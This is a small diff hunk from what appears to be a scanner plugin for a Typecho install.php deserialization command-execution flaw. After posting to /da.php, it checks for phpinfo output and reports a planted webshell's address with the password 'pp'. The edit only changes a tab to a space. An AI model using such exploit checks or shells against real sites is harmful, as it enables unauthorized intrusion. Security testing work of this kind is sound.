@@ -32,7 +32,7 @@ def audit(arg):
         code, head, body, redirect, log = hackhttp.hackhttp(arg + "/da.php",post=post_data ,headers = headers)
 
         if r"Configuration File (php.ini) Path" in body:
-            security_hole("存在typecho install.php反序列化命令执行漏洞..payload: "+vulnurl+"\tshell地址: "+shellpath+" 密码: pp")
+            security_hole("存在typecho install.php反序列化命令执行漏洞..payload: "+vulnurl+" shell地址: "+shellpath+" 密码: pp")
 
     except:
         pass
